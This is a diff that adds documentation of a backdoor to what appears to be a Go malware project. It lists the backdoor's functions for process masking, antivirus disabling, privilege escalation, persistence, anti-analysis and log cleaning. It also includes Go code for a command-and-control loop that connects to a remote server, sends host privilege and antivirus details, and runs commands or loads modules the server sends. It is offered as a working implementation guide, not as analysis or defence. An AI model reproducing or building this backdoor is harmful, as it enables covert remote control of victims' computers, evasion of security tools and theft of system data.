@@ -676,3 +676,207 @@ func compileExploit(sourceCode string) error {
 
     return nil
 } 
+
+## Backdoor Implementation Details
+
+### Core Functionality
+
+The backdoor implements the following key functions:
+
+1. **Stealth Presence**:
+   - `maskProcess()` - Process masking as system processes
+   - `hideProcess()` - Process hiding in Windows
+   - `hideFiles()` - Backdoor file hiding
+   - `setupAutostart()` - Persistence through autostart
+
+2. **Protection Bypass**:
+   - `bypassAV()` - Antivirus bypass
+   - `detectAV()` - Antivirus detection
+   - `disableAV()` - Antivirus disabling
+   - `maskFromAV()` - Antivirus masking
+   - `antiAnalysis()` - Analysis prevention
+   - `detectDebugger()` - Debugger detection
+
+3. **Privilege Escalation**:
+   - `tryExploits()` - Vulnerability exploitation
+   - `tryEscalatePrivileges()` - Privilege elevation
+   - `persistPrivileges()` - Privilege persistence
+   - Collection of Windows and Linux exploits
+
+4. **Network Communication**:
+   - C&C server connection
+   - `maskConnections()` - Network activity masking
+   - `maskDNS()` - DNS query masking
+   - `generateLegitTraffic()` - Legitimate traffic generation
+   - TLS encrypted communications
+
+5. **Command Execution**:
+   - `executeCommand()` - Command execution
+   - `executeAsSuperuser()` - Privileged command execution
+   - `adaptiveExecute()` - Adaptive command execution
+   - `loadModule()` - Additional module loading
+
+6. **Update and Recovery**:
+   - `selfUpdate()` - Self-update mechanism
+   - `verifyChecksum()` - Integrity verification
+   - `verifyServerCert()` - Server certificate verification
+
+7. **Detection Prevention**:
+   - `detectVM()` - Virtual machine detection
+   - `detectAnalysisTools()` - Analysis tools detection
+   - `detectNetworkAnalysis()` - Network analysis detection
+   - `antiDisassembly()` - Anti-disassembly measures
+   - `obfuscateStrings()` - String obfuscation
+   - `polymorphicEncrypt()` - Polymorphic encryption
+   - `obfuscateBinary()` - Binary obfuscation
+
+8. **Trace Cleaning**:
+   - `cleanLogs()` - System log cleaning
+   - Temporary file removal
+   - Activity trace masking
+
+### Startup Sequence
+
+When launched, the backdoor performs the following sequence of operations:
+
+1. **Initial Protection**:
+```go
+// Initialize analysis protection
+antiAnalysis()
+```
+- Checks for debuggers
+- Searches for analysis tools
+- Disables garbage collector
+- Clears environment variables
+- Self-destructs if analysis is detected
+
+2. **Process Masking**:
+```go
+// Process masking
+maskProcess()
+```
+- Linux: Masquerades as system processes (e.g., "[kworker/0:0H]")
+- Windows: Masquerades as system services (e.g., "svchost.exe")
+- Changes process name
+- Masks command line
+
+3. **File Hiding**:
+```go
+// Hide backdoor files
+hideFiles()
+```
+- Linux: Sets file attributes and creates decoy files
+- Windows: Sets hidden attributes and creates alternate data streams
+
+4. **Autostart Setup**:
+```go
+// Configure autostart
+setupAutostart()
+```
+- Linux: Creates systemd service
+- Windows: Adds registry entry
+- Protects files from deletion
+- Masks service/autostart entry
+
+5. **Network Masking Setup**:
+```go
+// Initialize network masking
+maskConnections()
+maskDNS()
+generateLegitTraffic()
+```
+- Masks network connections
+- Generates fake DNS queries
+- Creates legitimate background traffic
+
+6. **Main Connection Loop**:
+```go
+// Infinite C&C server connection loop
+for {
+    // Connect to control server
+    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ServerAddress, ServerPort), 30*time.Second)
+    if err != nil {
+        time.Sleep(ReconnectDelay * time.Second)
+        continue
+    }
+```
+- Attempts to connect to control server
+- Waits and retries on failure
+
+7. **Authentication**:
+```go
+// Send authentication
+conn.Write([]byte(obfuscate(SecretKey + "\n")))
+```
+- Sends encrypted secret key
+
+8. **System Information**:
+```go
+// Send system information
+sysInfo := fmt.Sprintf("%s|%s|%s|%v|%s|%v|%v",
+    getPrivileges(),
+    runtime.GOOS,
+    runtime.GOARCH,
+    isSuperuser(),
+    getAVStatus(),
+    canEscalate(),
+    isUACEnabled())
+
+conn.Write([]byte(obfuscate(sysInfo + "\n")))
+```
+- Collects system information:
+  - Current privileges
+  - Operating system
+  - Architecture
+  - Superuser status
+  - Antivirus status
+  - Privilege escalation possibility
+  - UAC status (Windows)
+
+9. **Command Processing Loop**:
+```go
+// Process commands
+reader := bufio.NewReader(conn)
+for {
+    command, err := reader.ReadString('\n')
+    if err != nil {
+        break
+    }
+    
+    command = strings.TrimSpace(deobfuscate(command))
+    
+    // Execute command
+    var result string
+    if strings.HasPrefix(command, "load_module:") {
+        moduleURL := strings.TrimPrefix(command, "load_module:")
+        result = loadModule(moduleURL)
+    } else {
+        result = adaptiveExecute(command)
+    }
+    
+    // Send result
+    conn.Write([]byte(obfuscate(result + "\n")))
+}
+```
+- Waits for server commands
+- Decrypts received commands
+- Executes commands or loads modules
+- Sends encrypted results
+
+10. **Connection Loss Handling**:
+```go
+// Reconnect after delay
+time.Sleep(ReconnectDelay * time.Second)
+```
+- Waits specified time
+- Attempts to reconnect
+- Cycle starts over
+
+In summary, at startup the backdoor:
+1. Establishes detection protection
+2. Masks its presence
+3. Ensures persistence
+4. Establishes secure C&C server connection
+5. Sends system information
+6. Enters command waiting and execution mode
+7. Automatically attempts to restore lost connections 
